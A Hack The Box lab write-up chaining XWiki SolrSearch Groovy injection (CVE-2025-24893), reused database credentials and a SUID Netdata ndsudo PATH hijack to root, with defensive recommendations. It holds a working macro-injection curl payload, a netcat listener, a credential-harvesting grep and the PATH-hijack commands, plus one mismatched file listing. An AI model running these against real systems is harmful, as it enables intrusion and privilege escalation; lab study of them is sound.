---
title: "Editor — XWiki CVE-2025-24893 RCE to Netdata ndsudo PATH Hijack"
description: "XWiki SolrSearch unauthenticated Groovy code execution (CVE-2025-24893) provides a foothold; reused database credentials enable SSH, and a SUID Netdata ndsudo helper is hijacked through PATH to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - xwiki
  - cve
  - path-hijacking
objective: "Obtain user and root control of an Ubuntu lab host through a vulnerable XWiki instance, cross-service credential reuse, and a SUID monitoring helper that trusts the caller's PATH."
tools:
  - rustscan
  - gobuster
  - curl
  - netcat
  - ssh
  - grep
  - suid3num
skill: "Unauthenticated web application exploitation and Linux privilege escalation via credential reuse and an unsafe SUID helper search path"
outcome: "Unauthenticated code execution as the XWiki service user, SSH access as a local account via a reused database password, and root command execution through the SUID Netdata ndsudo helper"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Ubuntu Linux; XWiki Debian 15.10.8 behind nginx and Jetty 10.0.20 |
| Starting position | Unauthenticated network access |
| Objective | Reach user and root control through a vulnerable XWiki instance, credential reuse, and a SUID monitoring helper |
| Outcome | Unauthenticated code execution as the XWiki service user, SSH access as a local account, and root command execution via the SUID Netdata `ndsudo` helper |

## XWiki SolrSearch RCE to PATH hijack

Editor is a Medium-rated Hack The Box Linux lab hosting XWiki behind an nginx virtual host. Enumeration exposes the wiki vhost running XWiki Debian 15.10.8, vulnerable to CVE-2025-24893: unauthenticated Groovy code execution through the `SolrSearch` endpoint. The foothold exposes XWiki database credentials that a local account reuses for SSH, and privilege escalation abuses a SUID Netdata `ndsudo` helper whose `PATH`-based dependency resolution permits binary hijacking to obtain root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves command syntax. See [how evidence is handled](/method/).

**Attack path:** **unauthenticated XWiki `SolrSearch` RCE (CVE-2025-24893) → `hibernate.cfg.xml` database credential recovery → SSH access via credential reuse → SUID Netdata `ndsudo` `PATH` hijack → root**

## Ubuntu host, XWiki behind nginx, unauthenticated, root

- **Target:** an Ubuntu Linux host exposing SSH (22), nginx (80), and Jetty/XWiki (8080).
- **Application:** nginx routes `<WIKI_HOST>` to an XWiki Debian 15.10.8 instance served by Jetty 10.0.20.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from the exposed web application to user and root control, and demonstrate the impact of an unpatched macro-injection flaw, credential reuse, and an unsafe privileged helper.
- **Constraints:** I kept activity inside the Hack The Box lab environment.

## Evidence: SolrSearch RCE to SUID PATH hijack

### 1. Service Discovery and Virtual Host Enumeration

Observation: a full port scan exposes three services, and port 8080 serves XWiki directly.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
```

```text
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp   open  http    nginx 1.18.0
8080/tcp open  http    Jetty 10.0.20
```

The port 8080 banner identifies the application as XWiki:

```text
| http-title: XWiki - Main - Intro
|_Requested resource was http://<TARGET_IP>:8080/xwiki/bin/view/Main/
```

Virtual-host fuzzing reveals the wiki subdomain:

```bash
gobuster vhost \
  --url http://<TARGET_HOST> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
<WIKI_HOST> Status: 302 [Size: 0] [--> http://<WIKI_HOST>/xwiki]
```

Significance: the port-80 service redirects to the base virtual host, while the discovered virtual host reaches the XWiki application, and the `8080` banner identifies both the product and its container.

Result: the wiki vhost (`<WIKI_HOST>`) is identified and resolves to an XWiki Debian 15.10.8 instance.

### 2. CVE-2025-24893: Unauthenticated XWiki Groovy Code Execution

Observation: the XWiki `SolrSearch` endpoint evaluates request input as wiki syntax, and CVE-2025-24893 lets an unauthenticated guest chain that evaluation into Groovy execution.

Action: I checked the SolrSearch execution path by starting a listener and triggering execution through a `SolrSearch` request that closes the current syntax context and nests async and Groovy macros around a command wrapper.

```bash
nc -nlvp <LISTENER_PORT>
```

```bash
curl -G 'http://<WIKI_HOST>/xwiki/bin/get/Main/SolrSearch' \
  --data-urlencode 'media=rss' \
  --data-urlencode 'text=}}}{{async async=false}}{{groovy}}<GROOVY_COMMAND_WRAPPER>.execute(){{/groovy}}{{/async}}'
```

The source records a shell as the XWiki service user; I could not verify this step from terminal output because none was retained.

Significance: the flaw executes in the XWiki service context without authentication, so the service user can read the application's configuration and the database credentials it holds.

Result: unauthenticated code execution is obtained as the XWiki service user.

### 3. Credential Discovery and SSH Access

Observation: the XWiki configuration stores its database password in plaintext.

```bash
grep -rn --include="*.xml" -i "password\|credential" /etc /var /opt 2>/dev/null
```

```text
/etc/xwiki/hibernate.cfg.xml:104:    <property name="hibernate.connection.password"><XWIKI_DB_PASSWORD></property>
```

The same password authenticates over SSH for the local account, which shares the secret:

```bash
ssh <LOCAL_USER>@<TARGET_HOST>
```

```text
<LOCAL_USER>@<TARGET_HOST>:~$
```

Significance: a database secret that should be scoped to the application also protects an interactive account, so a configuration disclosure becomes host access without a further exploit.

Result: an authenticated shell is obtained as `<LOCAL_USER>` using the reused database password.

### 4. SUID Enumeration and Netdata `ndsudo` PATH Hijack

Observation: SUID discovery lists a Netdata plugin helper installed with the SUID bit.

```bash
python3 suid3num.py
```

```text
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

The helper is owned by root and group `netdata`:

```bash
ls -l /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
```

```text
-rwsr-x--- 1 root netdata 965056 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
```

The local account is a member of the `netdata` group:

```bash
id
```

```text
uid=1000(<LOCAL_USER>) gid=1000(<LOCAL_USER>) groups=1000(<LOCAL_USER>),999(netdata)
```

Significance: membership in `netdata` lets the low-privileged account execute the SUID helpers, and `ndsudo` resolves its `nvme` dependency through the caller-controlled `PATH`, the documented untrusted-search-path issue CVE-2024-32019.

Action: place a malicious `nvme` binary in a controlled directory, prepend it to `PATH`, and invoke the helper's `nvme-list` action.

```bash
export PATH=/tmp/fakebin:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

```text
root@<TARGET_HOST>:/home/<LOCAL_USER># id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(<LOCAL_USER>)
```

Significance: the helper runs as root and trusts `PATH`, so the caller-controlled binary executes with root privileges, a privilege-boundary failure in a legitimate monitoring component.

Result: root command execution is confirmed by the root `id` output.

## Obstacles: wiki syntax parsing and PATH resolution

| Challenge | Decision | Rationale |
|---|---|---|
| The `SolrSearch` parameter is parsed as wiki syntax | Closed the syntax context, then nested async and Groovy macros around the command wrapper | The Groovy step only runs once the parameter is parsed as nested macros |
| The SUID helper resolves `nvme` through the caller's `PATH` | Prepended a controlled directory containing a malicious `nvme` to `PATH` before running `nvme-list` | The helper trusted `PATH`, so the first matching binary was executed as root |

## Outcome: root execution from XWiki service foothold

The case documents root-level command execution on the host, reached through unauthenticated code execution in the XWiki service context and a database password that also authenticated SSH for the local account. The escalation rests on an unpatched macro-injection flaw, credential reuse across services, and a SUID helper that resolved a dependency through the caller's `PATH`.

## Recommendations: XWiki patch, credential reuse, SUID PATH, group scope

I did not test these recommendations during this exercise.

1. **Unpatched XWiki macro injection (CVE-2025-24893).** A guest could reach code execution through `SolrSearch` on the exposed instance. *Recommendation:* upgrade to a fixed release (15.10.11, 16.4.1, or 16.5.0RC1) and restrict access to macro-execution endpoints. *Detection:* monitor requests to `SolrSearch` and unexpected `groovy`/`async` macro content in request parameters.
2. **Database password reused as an interactive credential.** The XWiki database password authenticated SSH for `<LOCAL_USER>`. *Recommendation:* issue unique, least-privilege credentials per service, never reuse application secrets for interactive accounts, and rotate any secret exposed in configuration. *Detection:* scan configuration and secret stores for credentials reused across services.
3. **SUID helper with an untrusted search path.** Netdata `ndsudo` executed the first `nvme` binary found in the caller's `PATH` with root privileges (CVE-2024-32019). *Recommendation:* resolve privileged dependencies by absolute path, sanitize `PATH` inside SUID binaries, and update Netdata to a fixed release. *Detection:* audit SUID helpers for `PATH`-based resolution and monitor privileged child-process execution from monitoring agents.
4. **Over-broad service group membership.** Membership in `netdata` allowed the low-privileged account to run the SUID helpers. *Recommendation:* keep `netdata` group membership limited to the service account and review it against least privilege. *Detection:* monitor service group membership changes.

## References

- [Hack The Box — Editor](https://app.hackthebox.com/machines/Editor) (retired machine)
- [NVD — CVE-2025-24893](https://nvd.nist.gov/vuln/detail/CVE-2025-24893) (XWiki `SolrSearch` remote code execution)
- [XWiki security advisory — GHSA-rr6p-3pfg-562j](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j) (vendor advisory and patched versions)
- [NVD — CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019) (Netdata `ndsudo` untrusted search path)
- [Netdata security advisory — GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) (vendor advisory)
- [RustScan](https://github.com/RustScan/RustScan) (port scanner)
- [Gobuster](https://github.com/OJ/gobuster) (virtual-host and content discovery)
- [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM) (SUID binary enumeration)
